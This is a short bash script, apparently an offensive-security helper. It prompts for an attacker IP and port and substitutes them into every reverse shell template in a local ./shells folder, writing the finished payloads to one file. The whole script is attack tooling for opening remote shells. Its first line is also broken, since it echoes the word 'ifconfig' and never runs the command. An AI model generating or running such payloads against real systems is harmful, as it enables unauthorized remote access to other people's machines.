#!/bin/bash
echo ifconfig | grep -w "inet" 
echo "Enter IP for reverse shell:"
read ip 
echo "Enter Port for Reverse Shell:"
read port
p="shells_for_$ip"
touch $p
for i in $(ls ./shells);
	do 
	echo "-----------$i-----------" >> "$p"
	sed "s|{ip}|$ip|gI; s|{port}|$port|gI" ./shells/$i >> "$p" 	
	printf "\n" >> "$p"	
done 
cat $p
